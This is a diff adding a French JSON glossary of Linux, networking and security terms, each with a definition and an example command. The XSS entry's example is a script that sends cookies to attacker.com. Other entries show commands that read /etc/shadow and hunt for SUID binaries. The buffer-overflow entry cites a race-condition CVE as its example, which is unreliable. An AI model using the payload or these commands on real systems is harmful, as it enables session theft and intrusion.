@@ -1,0 +1,698 @@
+{
+  "terms": [
+    {
+      "id": "acl",
+      "term": "ACL",
+      "full": "Access Control List",
+      "category": "permissions",
+      "letter": "A",
+      "definition": "Liste de règles associée à un fichier ou répertoire qui définit quels utilisateurs ou groupes ont accès et avec quels droits, au-delà des permissions Unix classiques (rwx).",
+      "example": "setfacl -m u:alice:rwx fichier.txt",
+      "related": ["chmod", "permissions", "sudo"]
+    },
+    {
+      "id": "alias",
+      "term": "Alias",
+      "category": "shell",
+      "letter": "A",
+      "definition": "Raccourci personnalisé pour une commande ou une séquence de commandes dans le shell. Défini dans ~/.bashrc pour être permanent.",
+      "example": "alias ll='ls -lah --color=auto'",
+      "related": ["bash", "shell", ".bashrc"]
+    },
+    {
+      "id": "apt",
+      "term": "APT",
+      "full": "Advanced Package Tool",
+      "category": "systeme",
+      "letter": "A",
+      "definition": "Gestionnaire de paquets des distributions Debian/Ubuntu. Permet d'installer, mettre à jour et supprimer des logiciels depuis des dépôts officiels.",
+      "example": "sudo apt install nginx",
+      "related": ["dpkg", "snap", "paquets"]
+    },
+    {
+      "id": "bash",
+      "term": "Bash",
+      "full": "Bourne Again Shell",
+      "category": "shell",
+      "letter": "B",
+      "definition": "Shell Unix le plus utilisé sur Linux. Interprète les commandes tapées dans le terminal et permet d'écrire des scripts. Successeur du shell Bourne (sh).",
+      "example": "#!/bin/bash\necho \"Hello World\"",
+      "related": ["shell", "terminal", "zsh"]
+    },
+    {
+      "id": "binaire",
+      "term": "Binaire",
+      "category": "systeme",
+      "letter": "B",
+      "definition": "Fichier exécutable compilé, directement interprétable par le processeur. Stocké généralement dans /usr/bin ou /bin. S'oppose aux scripts (texte interprété).",
+      "example": "/usr/bin/python3",
+      "related": ["PATH", "chmod +x", "ELF"]
+    },
+    {
+      "id": "buffer-overflow",
+      "term": "Buffer Overflow",
+      "category": "securite",
+      "letter": "B",
+      "definition": "Vulnérabilité où un programme écrit plus de données que prévu dans une zone mémoire, débordant dans des zones adjacentes. Peut permettre l'exécution de code arbitraire.",
+      "example": "CVE-2024-6387 (regreSSHion) est une exploitation de race condition dans OpenSSH",
+      "related": ["CVE", "exploit", "ASLR"]
+    },
+    {
+      "id": "chmod",
+      "term": "chmod",
+      "full": "Change Mode",
+      "category": "permissions",
+      "letter": "C",
+      "definition": "Commande Unix pour modifier les permissions d'un fichier ou répertoire. Les permissions définissent qui peut lire (r=4), écrire (w=2) ou exécuter (x=1) un fichier.",
+      "example": "chmod 755 script.sh  # rwxr-xr-x",
+      "related": ["chown", "umask", "ACL"]
+    },
+    {
+      "id": "chown",
+      "term": "chown",
+      "full": "Change Owner",
+      "category": "permissions",
+      "letter": "C",
+      "definition": "Commande pour changer le propriétaire (utilisateur et/ou groupe) d'un fichier ou répertoire. Nécessite les droits root pour changer le propriétaire.",
+      "example": "chown www-data:www-data /var/www/html",
+      "related": ["chmod", "permissions", "sudo"]
+    },
+    {
+      "id": "cron",
+      "term": "Cron",
+      "category": "systeme",
+      "letter": "C",
+      "definition": "Planificateur de tâches sous Linux. Exécute automatiquement des commandes ou scripts à des horaires définis via un fichier crontab. Syntaxe : minute heure jour mois jour_semaine.",
+      "example": "0 3 * * * /usr/bin/backup.sh  # tous les jours à 3h",
+      "related": ["crontab", "systemd timer", "daemon"]
+    },
+    {
+      "id": "cve",
+      "term": "CVE",
+      "full": "Common Vulnerabilities and Exposures",
+      "category": "securite",
+      "letter": "C",
+      "definition": "Système d'identification unique des vulnérabilités de sécurité informatique, géré par MITRE. Chaque faille reçoit un identifiant CVE-ANNÉE-NUMÉRO et un score CVSS.",
+      "example": "CVE-2024-6387 — faille critique dans OpenSSH (CVSS 8.1)",
+      "related": ["CVSS", "NVD", "exploit", "patch"]
+    },
+    {
+      "id": "cvss",
+      "term": "CVSS",
+      "full": "Common Vulnerability Scoring System",
+      "category": "securite",
+      "letter": "C",
+      "definition": "Score de 0 à 10 mesurant la sévérité d'une vulnérabilité. Prend en compte l'exploitabilité, l'impact et le contexte. 9-10 = Critique, 7-8.9 = Élevé, 4-6.9 = Moyen.",
+      "example": "CVSS 10.0 = vulnérabilité maximale (ex: RCE sans auth sur service exposé)",
+      "related": ["CVE", "NVD", "patch"]
+    },
+    {
+      "id": "daemon",
+      "term": "Daemon",
+      "category": "systeme",
+      "letter": "D",
+      "definition": "Programme s'exécutant en arrière-plan sans interface utilisateur, souvent au démarrage du système. Noms terminant généralement par 'd' : sshd, nginx, cron. Géré par systemd.",
+      "example": "systemctl status sshd",
+      "related": ["systemd", "service", "processus"]
+    },
+    {
+      "id": "dns",
+      "term": "DNS",
+      "full": "Domain Name System",
+      "category": "reseau",
+      "letter": "D",
+      "definition": "Système qui traduit les noms de domaine (google.com) en adresses IP (142.250.74.46). Fonctionne comme un annuaire téléphonique d'Internet. Écoute sur le port 53.",
+      "example": "dig google.com A  # interroge le DNS pour l'adresse IPv4",
+      "related": ["IP", "resolv.conf", "nmap"]
+    },
+    {
+      "id": "docker",
+      "term": "Docker",
+      "category": "virtualisation",
+      "letter": "D",
+      "definition": "Plateforme de conteneurisation permettant d'empaqueter une application et ses dépendances dans un conteneur isolé. Plus léger qu'une VM, partage le noyau Linux de l'hôte.",
+      "example": "docker run -d -p 80:80 nginx",
+      "related": ["conteneur", "image", "Dockerfile", "Kubernetes"]
+    },
+    {
+      "id": "elf",
+      "term": "ELF",
+      "full": "Executable and Linkable Format",
+      "category": "systeme",
+      "letter": "E",
+      "definition": "Format standard des fichiers exécutables, bibliothèques partagées et fichiers objet sous Linux. Contient le code machine, les données et les métadonnées nécessaires à l'exécution.",
+      "example": "file /bin/bash  # affiche: ELF 64-bit LSB pie executable",
+      "related": ["binaire", "ldd", "objdump"]
+    },
+    {
+      "id": "environnement",
+      "term": "Variable d'environnement",
+      "category": "shell",
+      "letter": "E",
+      "definition": "Variable globale disponible dans tous les processus d'une session shell. Stocke des informations système comme PATH (chemins des binaires), HOME (répertoire utilisateur), USER.",
+      "example": "export MA_VAR=\"valeur\"  # disponible dans tous les sous-processus",
+      "related": ["PATH", "bash", "export"]
+    },
+    {
+      "id": "exploit",
+      "term": "Exploit",
+      "category": "securite",
+      "letter": "E",
+      "definition": "Programme ou séquence de commandes qui tire parti d'une vulnérabilité pour obtenir un comportement non prévu, généralement pour escalader des privilèges ou exécuter du code.",
+      "example": "python3 exploit.py --target 192.168.1.10 --cve CVE-2024-6387",
+      "related": ["CVE", "buffer overflow", "privilege escalation", "payload"]
+    },
+    {
+      "id": "fail2ban",
+      "term": "Fail2Ban",
+      "category": "securite",
+      "letter": "F",
+      "definition": "Outil de protection contre les attaques par force brute. Analyse les logs système en temps réel et bloque automatiquement les IPs effectuant trop de tentatives échouées.",
+      "example": "fail2ban-client status sshd  # voir les IPs bannies",
+      "related": ["SSH", "iptables", "UFW", "logs"]
+    },
+    {
+      "id": "firewall",
+      "term": "Pare-feu (Firewall)",
+      "category": "securite",
+      "letter": "F",
+      "definition": "Système filtrant le trafic réseau entrant et sortant selon des règles définies. Sous Linux : iptables (bas niveau), UFW (interface simplifiée), nftables (moderne).",
+      "example": "ufw allow 443/tcp && ufw deny 23",
+      "related": ["UFW", "iptables", "nftables", "réseau"]
+    },
+    {
+      "id": "fork",
+      "term": "Fork",
+      "category": "systeme",
+      "letter": "F",
+      "definition": "Appel système qui crée un processus enfant identique au processus parent. La plupart des processus Linux sont créés via fork(). Le shell fork() pour chaque commande exécutée.",
+      "example": "Quand tu lances 'ls', le shell fork() pour créer un processus ls",
+      "related": ["processus", "PID", "exec", "daemon"]
+    },
+    {
+      "id": "git",
+      "term": "Git",
+      "category": "developpement",
+      "letter": "G",
+      "definition": "Système de contrôle de version distribué. Permet de suivre les modifications d'un projet, travailler en équipe et revenir à des états antérieurs. Créé par Linus Torvalds en 2005.",
+      "example": "git commit -am \"fix: correction du bug de connexion\"",
+      "related": ["GitHub", "branch", "merge", "commit"]
+    },
+    {
+      "id": "grep",
+      "term": "grep",
+      "full": "Global Regular Expression Print",
+      "category": "shell",
+      "letter": "G",
+      "definition": "Outil de recherche de motifs dans des fichiers ou flux de texte. Supporte les expressions régulières. Incontournable pour analyser des logs ou filtrer des sorties.",
+      "example": "grep -r 'password' /etc/ 2>/dev/null",
+      "related": ["regex", "awk", "sed", "pipe"]
+    },
+    {
+      "id": "hash",
+      "term": "Hash (Hachage)",
+      "category": "securite",
+      "letter": "H",
+      "definition": "Empreinte numérique de taille fixe générée à partir de données quelconques via une fonction mathématique. Irréversible. Utilisé pour vérifier l'intégrité et stocker les mots de passe.",
+      "example": "sha256sum fichier.iso  # vérifie l'intégrité d'un fichier",
+      "related": ["SHA-256", "MD5", "bcrypt", "salt"]
+    },
+    {
+      "id": "inode",
+      "term": "Inode",
+      "category": "systeme",
+      "letter": "I",
+      "definition": "Structure de données du système de fichiers Linux qui stocke les métadonnées d'un fichier : permissions, propriétaire, timestamps, taille, adresses des blocs de données. Chaque fichier a un inode unique.",
+      "example": "ls -i fichier.txt  # affiche le numéro d'inode",
+      "related": ["filesystem", "ext4", "lien symbolique"]
+    },
+    {
+      "id": "ip",
+      "term": "Adresse IP",
+      "full": "Internet Protocol",
+      "category": "reseau",
+      "letter": "I",
+      "definition": "Identifiant numérique unique attribué à chaque appareil sur un réseau. IPv4 : 4 octets (ex: 192.168.1.1). IPv6 : 128 bits (ex: 2001:db8::1). Deux types : publique (Internet) et privée (LAN).",
+      "example": "ip a  # affiche toutes les interfaces et leurs IPs",
+      "related": ["DNS", "sous-réseau", "routage", "DHCP"]
+    },
+    {
+      "id": "iptables",
+      "term": "iptables",
+      "category": "reseau",
+      "letter": "I",
+      "definition": "Outil de configuration du pare-feu Linux au niveau du noyau. Filtre les paquets réseau selon des règles (INPUT, OUTPUT, FORWARD). Progressivement remplacé par nftables.",
+      "example": "iptables -A INPUT -p tcp --dport 22 -j ACCEPT",
+      "related": ["pare-feu", "UFW", "nftables", "réseau"]
+    },
+    {
+      "id": "kernel",
+      "term": "Noyau (Kernel)",
+      "category": "systeme",
+      "letter": "K",
+      "definition": "Cœur du système d'exploitation Linux. Gère les ressources matérielles (CPU, RAM, disques), les processus et la communication entre logiciels et hardware. Créé par Linus Torvalds en 1991.",
+      "example": "uname -r  # affiche la version du noyau actuel",
+      "related": ["module noyau", "syscall", "espace noyau"]
+    },
+    {
+      "id": "ldap",
+      "term": "LDAP",
+      "full": "Lightweight Directory Access Protocol",
+      "category": "reseau",
+      "letter": "L",
+      "definition": "Protocole d'annuaire permettant de centraliser la gestion des utilisateurs et authentifications. Utilisé en entreprise pour gérer les comptes depuis un serveur central (Active Directory, OpenLDAP).",
+      "example": "ldapsearch -x -H ldap://server -b 'dc=example,dc=com'",
+      "related": ["Active Directory", "authentification", "DNS"]
+    },
+    {
+      "id": "lien-symbolique",
+      "term": "Lien symbolique",
+      "category": "systeme",
+      "letter": "L",
+      "definition": "Fichier spécial qui pointe vers un autre fichier ou répertoire (comme un raccourci Windows). S'affiche avec 'l' en début de permissions dans ls -la. Créé avec ln -s.",
+      "example": "ln -s /usr/bin/python3 /usr/local/bin/python",
+      "related": ["inode", "ln", "lien dur"]
+    },
+    {
+      "id": "log",
+      "term": "Logs système",
+      "category": "systeme",
+      "letter": "L",
+      "definition": "Fichiers enregistrant les événements du système et des applications. Stockés dans /var/log/. Essentiels pour le débogage et la détection d'intrusions. Gérés par syslog ou journald.",
+      "example": "journalctl -u nginx --since '1 hour ago'",
+      "related": ["journald", "syslog", "audit", "fail2ban"]
+    },
+    {
+      "id": "malware",
+      "term": "Malware",
+      "category": "securite",
+      "letter": "M",
+      "definition": "Logiciel malveillant conçu pour nuire : virus, ransomware, spyware, rootkit, trojan. Sous Linux, les malwares ciblent souvent les serveurs mal configurés ou non patchés.",
+      "example": "Détection : chkrootkit, rkhunter, ClamAV",
+      "related": ["ransomware", "rootkit", "antivirus", "IOC"]
+    },
+    {
+      "id": "manpage",
+      "term": "Man page",
+      "category": "shell",
+      "letter": "M",
+      "definition": "Documentation intégrée d'une commande Linux, accessible via la commande 'man'. Organisée en sections (1=commandes user, 5=fichiers config, 8=admin). Navigation : flèches, q pour quitter.",
+      "example": "man chmod  # documentation complète de chmod",
+      "related": ["--help", "info", "tldr"]
+    },
+    {
+      "id": "mount",
+      "term": "Montage (Mount)",
+      "category": "systeme",
+      "letter": "M",
+      "definition": "Opération qui rattache un système de fichiers (partition, clé USB, image ISO) à un point du système de fichiers Linux. Tout est accessible via une arborescence unique sous /.",
+      "example": "mount /dev/sdb1 /mnt/usb",
+      "related": ["/etc/fstab", "umount", "LVM", "partition"]
+    },
+    {
+      "id": "nmap",
+      "term": "Nmap",
+      "full": "Network Mapper",
+      "category": "securite",
+      "letter": "N",
+      "definition": "Outil open-source de scan réseau et d'audit de sécurité. Permet de découvrir les hôtes actifs, les ports ouverts, les services en écoute et les systèmes d'exploitation sur un réseau.",
+      "example": "nmap -sV -O 192.168.1.0/24",
+      "related": ["port", "TCP", "pentest", "reconnaissance"]
+    },
+    {
+      "id": "ntp",
+      "term": "NTP",
+      "full": "Network Time Protocol",
+      "category": "reseau",
+      "letter": "N",
+      "definition": "Protocole de synchronisation de l'horloge des systèmes via Internet. Crucial pour la corrélation des logs, les certificats TLS et les systèmes d'authentification (Kerberos).",
+      "example": "timedatectl status  # vérifie la synchro NTP",
+      "related": ["logs", "TLS", "Kerberos"]
+    },
+    {
+      "id": "package",
+      "term": "Paquet (Package)",
+      "category": "systeme",
+      "letter": "P",
+      "definition": "Archive contenant un logiciel et ses métadonnées (version, dépendances, scripts). Format .deb sur Debian/Ubuntu, .rpm sur RedHat/Fedora. Géré par APT, dpkg, yum, dnf.",
+      "example": "apt show nginx  # infos sur le paquet nginx",
+      "related": ["APT", "dpkg", "dépôt", "PPA"]
+    },
+    {
+      "id": "path",
+      "term": "PATH",
+      "category": "shell",
+      "letter": "P",
+      "definition": "Variable d'environnement listant les répertoires où le shell cherche les exécutables. Quand tu tapes 'ls', le shell cherche 'ls' dans chaque dossier du PATH.",
+      "example": "echo $PATH  # /usr/local/bin:/usr/bin:/bin",
+      "related": ["variable d'environnement", "which", "binaire"]
+    },
+    {
+      "id": "pentest",
+      "term": "Pentest",
+      "full": "Penetration Testing",
+      "category": "securite",
+      "letter": "P",
+      "definition": "Test d'intrusion autorisé visant à évaluer la sécurité d'un système en simulant une attaque réelle. Phases : reconnaissance, scan, exploitation, post-exploitation, rapport.",
+      "example": "Outils : nmap, Metasploit, Burp Suite, Hydra",
+      "related": ["CVE", "exploit", "nmap", "CTF"]
+    },
+    {
+      "id": "pid",
+      "term": "PID",
+      "full": "Process IDentifier",
+      "category": "systeme",
+      "letter": "P",
+      "definition": "Numéro unique attribué à chaque processus en cours d'exécution. Le processus init/systemd a toujours le PID 1. Utilisé par kill, top, ps pour identifier un processus.",
+      "example": "ps aux | grep nginx  # trouve le PID de nginx",
+      "related": ["processus", "kill", "top", "fork"]
+    },
+    {
+      "id": "pipe",
+      "term": "Pipe (|)",
+      "category": "shell",
+      "letter": "P",
+      "definition": "Opérateur shell qui connecte la sortie standard (stdout) d'une commande à l'entrée standard (stdin) de la suivante. Permet de chaîner des commandes pour des traitements complexes.",
+      "example": "ps aux | grep nginx | awk '{print $2}'",
+      "related": ["stdin", "stdout", "grep", "awk"]
+    },
+    {
+      "id": "port",
+      "term": "Port réseau",
+      "category": "reseau",
+      "letter": "P",
+      "definition": "Numéro de 0 à 65535 identifiant un service réseau sur une machine. Ports connus : 22 (SSH), 80 (HTTP), 443 (HTTPS), 3306 (MySQL). En dessous de 1024 = ports privilégiés (root requis).",
+      "example": "ss -tuln  # liste tous les ports en écoute",
+      "related": ["TCP", "UDP", "nmap", "pare-feu"]
+    },
+    {
+      "id": "privilege-escalation",
+      "term": "Élévation de privilèges",
+      "category": "securite",
+      "letter": "E",
+      "definition": "Technique permettant à un utilisateur avec des droits limités d'obtenir des droits supérieurs (root). Deux types : vertical (user → root) et horizontal (user A → user B). Vecteur d'attaque courant.",
+      "example": "find / -perm /4000 2>/dev/null  # cherche les binaires SUID",
+      "related": ["SUID", "sudo", "CVE", "exploit"]
+    },
+    {
+      "id": "processus",
+      "term": "Processus",
+      "category": "systeme",
+      "letter": "P",
+      "definition": "Instance d'un programme en cours d'exécution. Possède un PID, un espace mémoire, des fichiers ouverts et un propriétaire. Géré par le noyau qui lui alloue du temps CPU.",
+      "example": "ps aux  # liste tous les processus avec leur PID et consommation",
+      "related": ["PID", "fork", "daemon", "kill"]
+    },
+    {
+      "id": "ransomware",
+      "term": "Ransomware",
+      "category": "securite",
+      "letter": "R",
+      "definition": "Logiciel malveillant qui chiffre les fichiers d'une victime et exige une rançon pour les déchiffrer. Sous Linux, cible souvent les serveurs et hyperviseurs VMware ESXi. En forte augmentation.",
+      "example": "Groupes connus : LockBit, BlackCat, Nitrogen, ShinyHunters",
+      "related": ["malware", "chiffrement", "backup", "IOC"]
+    },
+    {
+      "id": "rce",
+      "term": "RCE",
+      "full": "Remote Code Execution",
+      "category": "securite",
+      "letter": "R",
+      "definition": "Vulnérabilité critique permettant à un attaquant d'exécuter du code arbitraire sur un système distant, souvent sans authentification. Considérée comme l'une des failles les plus dangereuses.",
+      "example": "CVE-2024-6387 permet un RCE sur OpenSSH sans authentification",
+      "related": ["CVE", "exploit", "payload", "reverse shell"]
+    },
+    {
+      "id": "regex",
+      "term": "Regex",
+      "full": "Regular Expression",
+      "category": "shell",
+      "letter": "R",
+      "definition": "Séquence de caractères formant un motif de recherche. Utilisée avec grep, sed, awk pour filtrer et manipuler du texte. Syntaxe : ^ (début), $ (fin), . (n'importe quel caractère), * (répétition).",
+      "example": "grep -E '^[0-9]{1,3}\\.[0-9]{1,3}' /var/log/auth.log",
+      "related": ["grep", "sed", "awk", "pattern"]
+    },
+    {
+      "id": "root",
+      "term": "Root",
+      "category": "permissions",
+      "letter": "R",
+      "definition": "Superutilisateur du système Linux avec tous les droits. UID 0. Peut modifier tout fichier, tuer tout processus, charger des modules noyau. Son répertoire home est /root.",
+      "example": "sudo -i  # obtenir un shell root",
+      "related": ["sudo", "UID", "permissions", "su"]
+    },
+    {
+      "id": "rootkit",
+      "term": "Rootkit",
+      "category": "securite",
+      "letter": "R",
+      "definition": "Ensemble de malwares conçus pour dissimuler leur présence et maintenir un accès persistant à un système compromis, souvent en modifiant le noyau ou des utilitaires système.",
+      "example": "rkhunter --check  # détection de rootkits",
+      "related": ["malware", "persistence", "kernel", "audit"]
+    },
+    {
+      "id": "rsync",
+      "term": "rsync",
+      "category": "systeme",
+      "letter": "R",
+      "definition": "Outil de synchronisation efficace de fichiers locaux ou distants. Ne transfère que les différences entre source et destination. Très utilisé pour les backups.",
+      "example": "rsync -avz /var/www/ user@backup-server:/backups/",
+      "related": ["scp", "SSH", "backup", "cron"]
+    },
+    {
+      "id": "salt",
+      "term": "Salt (cryptographie)",
+      "category": "securite",
+      "letter": "S",
+      "definition": "Valeur aléatoire unique ajoutée à un mot de passe avant hachage, pour éviter les attaques par tables de correspondance (rainbow tables). Chaque mot de passe a son propre salt.",
+      "example": "Le fichier /etc/shadow stocke : $6$salt$hash_sha512",
+      "related": ["hash", "bcrypt", "shadow", "mot de passe"]
+    },
+    {
+      "id": "selinux",
+      "term": "SELinux",
+      "full": "Security-Enhanced Linux",
+      "category": "securite",
+      "letter": "S",
+      "definition": "Module de sécurité du noyau Linux implémentant le contrôle d'accès obligatoire (MAC). Restreint les actions des processus même root. Utilisé par défaut sur RHEL/CentOS/Fedora.",
+      "example": "getenforce  # Enforcing = actif, Permissive = logs seulement",
+      "related": ["AppArmor", "permissions", "MAC", "noyau"]
+    },
+    {
+      "id": "service",
+      "term": "Service",
+      "category": "systeme",
+      "letter": "S",
+      "definition": "Programme s'exécutant en arrière-plan (daemon) géré par le système d'init. Sous les distributions modernes, systemd gère les services via des fichiers .service dans /etc/systemd/system/.",
+      "example": "systemctl enable --now nginx  # active et démarre nginx",
+      "related": ["systemd", "daemon", "PID", "journald"]
+    },
+    {
+      "id": "shadow",
+      "term": "/etc/shadow",
+      "category": "securite",
+      "letter": "S",
+      "definition": "Fichier système stockant les mots de passe hachés des utilisateurs Linux. Lisible uniquement par root. Contient le hash, le salt, la date de dernier changement et la politique d'expiration.",
+      "example": "sudo cat /etc/shadow | grep root",
+      "related": ["/etc/passwd", "hash", "salt", "permissions"]
+    },
+    {
+      "id": "shell",
+      "term": "Shell",
+      "category": "shell",
+      "letter": "S",
+      "definition": "Interface de ligne de commande permettant d'interagir avec le système d'exploitation. Interprète les commandes de l'utilisateur et exécute les programmes. Les plus courants : bash, zsh, sh, fish.",
+      "example": "echo $SHELL  # affiche ton shell par défaut",
+      "related": ["bash", "terminal", "zsh", "script"]
+    },
+    {
+      "id": "shebang",
+      "term": "Shebang (#!)",
+      "category": "shell",
+      "letter": "S",
+      "definition": "Première ligne d'un script indiquant au système quel interpréteur utiliser pour l'exécuter. Le noyau lit ces 2 caractères pour déterminer comment lancer le fichier.",
+      "example": "#!/bin/bash  ou  #!/usr/bin/env python3",
+      "related": ["bash", "script", "chmod +x", "interpréteur"]
+    },
+    {
+      "id": "ssh",
+      "term": "SSH",
+      "full": "Secure Shell",
+      "category": "reseau",
+      "letter": "S",
+      "definition": "Protocole de connexion à distance sécurisé via chiffrement. Remplace telnet. Écoute sur le port 22. Supporte l'authentification par mot de passe ou par clé publique/privée (plus sécurisé).",
+      "example": "ssh -i ~/.ssh/id_ed25519 user@192.168.1.10",
+      "related": ["port 22", "clé SSH", "fail2ban", "scp"]
+    },
+    {
+      "id": "ssh-key",
+      "term": "Clé SSH",
+      "category": "securite",
+      "letter": "C",
+      "definition": "Paire de clés cryptographiques (publique + privée) pour s'authentifier sur SSH sans mot de passe. La clé publique va sur le serveur (~/.ssh/authorized_keys), la privée reste sur le client.",
+      "example": "ssh-keygen -t ed25519 -C 'mon@email.com'",
+      "related": ["SSH", "authentification", "cryptographie"]
+    },
+    {
+      "id": "stdin-stdout",
+      "term": "stdin / stdout / stderr",
+      "category": "shell",
+      "letter": "S",
+      "definition": "Les 3 flux standard d'un processus Unix. stdin (0) : entrée clavier. stdout (1) : sortie normale. stderr (2) : sortie d'erreurs. Peuvent être redirigés avec >, >> et 2>.",
+      "example": "commande > sortie.txt 2>erreurs.txt",
+      "related": ["pipe", "redirection", "shell", "processus"]
+    },
+    {
+      "id": "suid",
+      "term": "SUID",
+      "full": "Set User ID",
+      "category": "permissions",
+      "letter": "S",
+      "definition": "Bit de permission spécial qui permet à un exécutable de s'exécuter avec les privilèges de son propriétaire (souvent root) plutôt que ceux de l'utilisateur qui le lance. Vecteur d'escalade de privilèges.",
+      "example": "find / -perm /4000 2>/dev/null  # audit sécurité SUID",
+      "related": ["permissions", "SGID", "privilege escalation", "chmod"]
+    },
+    {
+      "id": "sudo",
+      "term": "sudo",
+      "full": "Superuser Do",
+      "category": "permissions",
+      "letter": "S",
+      "definition": "Commande permettant à un utilisateur autorisé d'exécuter des commandes avec les droits root ou d'un autre utilisateur. Les autorisations sont définies dans /etc/sudoers.",
+      "example": "sudo visudo  # édite le fichier sudoers de façon sécurisée",
+      "related": ["root", "su", "/etc/sudoers", "permissions"]
+    },
+    {
+      "id": "systemd",
+      "term": "systemd",
+      "category": "systeme",
+      "letter": "S",
+      "definition": "Système d'init et gestionnaire de services des distributions Linux modernes. Démarre en premier (PID 1), lance tous les services, gère les logs (journald), les montages, les timers.",
+      "example": "systemctl list-units --type=service --state=running",
+      "related": ["service", "journald", "daemon", "cron"]
+    },
+    {
+      "id": "tcp-ip",
+      "term": "TCP/IP",
+      "category": "reseau",
+      "letter": "T",
+      "definition": "Suite de protocoles fondamentaux d'Internet. TCP (couche transport) garantit la livraison ordonnée des données via un handshake en 3 étapes. IP (couche réseau) gère l'adressage et le routage.",
+      "example": "tcpdump -i eth0 port 80  # capture le trafic HTTP",
+      "related": ["port", "UDP", "socket", "OSI"]
+    },
+    {
+      "id": "terminal",
+      "term": "Terminal",
+      "category": "shell",
+      "letter": "T",
+      "definition": "Application émulant un terminal texte, permettant d'accéder au shell. À distinguer du shell (programme) et de la console (terminal physique). Exemples : GNOME Terminal, iTerm2, Alacritty.",
+      "example": "Ctrl+Alt+T  # ouvre un terminal sur Ubuntu/Debian",
+      "related": ["shell", "bash", "TTY", "SSH"]
+    },
+    {
+      "id": "tls",
+      "term": "TLS/SSL",
+      "full": "Transport Layer Security",
+      "category": "reseau",
+      "letter": "T",
+      "definition": "Protocole de chiffrement sécurisant les communications réseau (HTTPS, SMTPS, SFTP). SSL est l'ancienne version (dépréciée). Un certificat TLS prouve l'identité d'un serveur.",
+      "example": "openssl s_client -connect google.com:443  # inspecte le certificat",
+      "related": ["HTTPS", "certificat", "Let's Encrypt", "port 443"]
+    },
+    {
+      "id": "ufw",
+      "term": "UFW",
+      "full": "Uncomplicated Firewall",
+      "category": "securite",
+      "letter": "U",
+      "definition": "Interface simplifiée pour configurer iptables sur Ubuntu/Debian. Permet de gérer les règles de pare-feu avec des commandes intuitives. Recommandé pour les débutants.",
+      "example": "ufw enable && ufw allow ssh && ufw allow 443",
+      "related": ["iptables", "pare-feu", "port", "réseau"]
+    },
+    {
+      "id": "umask",
+      "term": "umask",
+      "category": "permissions",
+      "letter": "U",
+      "definition": "Masque définissant les permissions par défaut des nouveaux fichiers et répertoires créés. Valeur habituelle 022 : les fichiers créés ont les permissions 644 (rw-r--r--).",
+      "example": "umask 027  # nouveaux fichiers lisibles uniquement par le groupe",
+      "related": ["chmod", "permissions", "shell"]
+    },
+    {
+      "id": "uid-gid",
+      "term": "UID / GID",
+      "full": "User/Group IDentifier",
+      "category": "permissions",
+      "letter": "U",
+      "definition": "Identifiants numériques uniques attribués aux utilisateurs (UID) et groupes (GID). Root = UID 0. Les utilisateurs système ont des UID < 1000. Consultables dans /etc/passwd et /etc/group.",
+      "example": "id alice  # uid=1001(alice) gid=1001(alice) groups=...",
+      "related": ["root", "permissions", "/etc/passwd", "chown"]
+    },
+    {
+      "id": "vim",
+      "term": "Vim",
+      "category": "shell",
+      "letter": "V",
+      "definition": "Éditeur de texte en ligne de commande très puissant, présent sur presque tous les systèmes Unix. Modes : Normal (navigation/commandes), Insertion (saisie), Visuel (sélection). Courbe d'apprentissage élevée.",
+      "example": ":wq  # sauvegarder et quitter  |  i  # passer en mode insertion",
+      "related": ["nano", "éditeur", "terminal", "configuration"]
+    },
+    {
+      "id": "vpn",
+      "term": "VPN",
+      "full": "Virtual Private Network",
+      "category": "reseau",
+      "letter": "V",
+      "definition": "Tunnel chiffré entre deux points du réseau. Permet d'accéder à un réseau privé à distance ou de chiffrer son trafic Internet. Implémentations Linux : WireGuard (moderne), OpenVPN.",
+      "example": "wg show  # affiche l'état d'une interface WireGuard",
+      "related": ["TLS", "chiffrement", "réseau", "WireGuard"]
+    },
+    {
+      "id": "vulnerability",
+      "term": "Vulnérabilité",
+      "category": "securite",
+      "letter": "V",
+      "definition": "Faiblesse dans un système, logiciel ou configuration pouvant être exploitée par un attaquant. Classifiée par CVE et notée par CVSS. Peut être 0-day (inconnue du vendeur) ou divulguée.",
+      "example": "CVE-2024-3094 (XZ Utils backdoor) — CVSS 10.0",
+      "related": ["CVE", "CVSS", "exploit", "patch", "0-day"]
+    },
+    {
+      "id": "wildcard",
+      "term": "Wildcard (*)",
+      "category": "shell",
+      "letter": "W",
+      "definition": "Caractère joker dans le shell remplacé par le shell (globbing) avant d'exécuter la commande. * = tout, ? = un caractère, [abc] = un caractère parmi a, b ou c.",
+      "example": "rm *.log  # supprime tous les fichiers .log",
+      "related": ["glob", "regex", "bash", "find"]
+    },
+    {
+      "id": "xss",
+      "term": "XSS",
+      "full": "Cross-Site Scripting",
+      "category": "securite",
+      "letter": "X",
+      "definition": "Vulnérabilité web permettant d'injecter du code JavaScript malveillant dans une page web consultée par d'autres utilisateurs. Peut voler des cookies, rediriger vers des sites malveillants.",
+      "example": "<script>document.location='http://attacker.com?c='+document.cookie</script>",
+      "related": ["injection SQL", "OWASP", "CSP", "cookies"]
+    },
+    {
+      "id": "zero-day",
+      "term": "Zero-day (0-day)",
+      "category": "securite",
+      "letter": "Z",
+      "definition": "Vulnérabilité inconnue du vendeur ou sans correctif disponible au moment de son exploitation. Très dangereuse car aucune défense n'existe. Vendue sur des marchés spécialisés ou utilisée par des APT.",
+      "example": "Le groupe NSO exploitait des 0-days iOS pour son logiciel Pegasus",
+      "related": ["CVE", "exploit", "APT", "patch"]
+    },
+    {
+      "id": "zsh",
+      "term": "Zsh",
+      "full": "Z Shell",
+      "category": "shell",
+      "letter": "Z",
+      "definition": "Shell alternatif à Bash, shell par défaut sur macOS depuis Catalina. Plus de fonctionnalités interactives : autocomplétion avancée, thèmes (Oh-My-Zsh), correction automatique.",
+      "example": "chsh -s /usr/bin/zsh  # définit zsh comme shell par défaut",
+      "related": ["bash", "shell", "Oh-My-Zsh", "terminal"]
+    }
+  ]
+}
